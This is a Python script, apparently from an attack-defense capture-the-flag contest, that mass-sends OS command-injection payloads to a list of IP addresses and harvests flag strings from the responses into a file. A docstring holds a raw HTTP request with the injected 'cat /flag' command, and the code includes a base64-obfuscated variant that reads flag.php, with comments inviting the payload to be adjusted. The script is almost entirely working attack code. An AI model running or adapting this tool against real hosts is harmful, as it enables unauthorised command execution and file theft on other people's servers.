from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests
import re

'''
POST / HTTP/1.1
Host: 192.168.208.2
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Referer: http://192.168.208.2/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Origin: http://192.168.208.2
Accept-Encoding: gzip, deflate
Content-Length: 27

ip=127.0.0.12%3Bcat+%2Fflag
'''
# 配置参数
IP_RANGE = range(170, 252)
PORTS = [80]  # 可扩展常见Web端口
TIMEOUT = 3
THREADS = 20
FLAG_PATTERN = re.compile(r'(flag|ctf|key)\{[a-zA-Z0-9_-]+\}', re.IGNORECASE)
FLAG_FILE = "flag.txt"


def get_flag(ip_list):
    """并发向每个IP发送命令注入请求，提取flag"""
    flag_dict = {}
    data = {"ip": "127.0.0.1;cat /flag"}  # 根据实际调整payload
    data = {"ip": "127.0.0.1;ec\ho \"Y2F0IGZsYWcucGhw\"|base64 -d"}  # 根据实际调整payload
    def attack(ip):
        url = f"http://{ip}"  # 若已知端口可拼接，否则可尝试常见端口
        try:
            r = requests.post(url, data=data, timeout=TIMEOUT)
            if r.status_code == 200:
                match = FLAG_PATTERN.search(r.text)
                if match:
                    flag = match.group(0)  # 完整flag
                    logging.info(f"{ip} found flag: {flag}")
                    return ip, flag
                else:
                    logging.warning(f"{ip} 200 but no flag")
                    return ip, None
            else:
                logging.warning(f"{ip} status {r.status_code}")
                return ip, None
        except Exception as e:
            logging.error(f"{ip} request failed: {e}")
            return ip, None

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(attack, ip): ip for ip in ip_list}
        for future in as_completed(futures):
            ip, flag = future.result()
            flag_dict[ip] = flag

    # 写入结果文件
    if flag_dict:
        with open(FLAG_FILE, "w", encoding="utf-8") as f:
            for ip, flag in flag_dict.items():
                f.write(f"{ip}: {flag}\n")
        return flag_dict
    return None


if __name__ == "__main__":
    ip_list = []
    with open('自动_ip.txt', 'r', encoding='utf-8') as file:
        # 逐行读取
        line = file.readline()
        # 循环直到文件末尾
        while line:
            # 将读取的行添加到列表中，移除行尾的换行符
            ip_list.append(line.strip())
            # 读取下一行
            line = file.readline()
    get_flag(ip_list)
